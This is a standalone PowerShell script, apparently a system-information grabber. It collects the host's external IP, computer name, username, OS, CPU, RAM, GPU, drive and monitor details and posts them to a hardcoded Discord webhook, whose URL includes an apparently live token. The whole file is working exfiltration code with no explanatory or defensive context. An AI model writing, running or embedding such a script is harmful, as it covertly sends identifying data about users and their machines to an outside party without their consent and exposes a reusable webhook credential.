$webhookUrl = "https://discord.com/api/webhooks/1297857116102721577/IM6TnftAs1B8vmh__zSG7tmnqciJbx3KnCVZc2-mSxYneRIP0U2N0uWXxTV4jTSoD9K-"

$externalIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").IP
$deviceInfo = @{
    ComputerName = $env:COMPUTERNAME
    Username = $env:USERNAME
    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    CPU = (Get-WmiObject -Class Win32_Processor).Name
    RAM = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    IP = $externalIp
    GPU = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
        @{
            Name = $_.Name
            RAM = [math]::round($_.AdapterRAM / 1MB, 2)
            DriverVersion = $_.DriverVersion
        }
    }
    HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
        @{
            Model = $_.Model
            Size = [math]::round($_.Size / 1GB, 2)
        }
    }
    Monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
        @{
            Name = $_.Name
            Resolution = "${($_.ScreenWidth)}x${($_.ScreenHeight)}"
        }
    }
}
$deviceInfoFormatted = "DEVICE INFO:`n" +
    "Computer Name: $($deviceInfo.ComputerName)`n" +
    "Username: $($deviceInfo.Username)`n" +
    "OS: $($deviceInfo.OS)`n" +
    "CPU: $($deviceInfo.CPU)`n" +
    "RAM (GB): $($deviceInfo.RAM)`n" +
    "External IP: $($deviceInfo.IP)`n" +
    "GPU:`n"
foreach ($gpu in $deviceInfo.GPU) {
    $deviceInfoFormatted += "  - Name: $($gpu.Name), RAM (MB): $($gpu.RAM), Driver: $($gpu.DriverVersion)`n"
}
$deviceInfoFormatted += "Hard Drives:`n"
foreach ($drive in $deviceInfo.HardDrives) {
    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.Size)`n"
}
$deviceInfoFormatted += "Monitors:`n"
foreach ($monitor in $deviceInfo.Monitors) {
    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: $($monitor.Resolution)`n"
}
$deviceInfoMessage = @{ content = $deviceInfoFormatted }
$jsonMessage = $deviceInfoMessage | ConvertTo-Json
$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
$response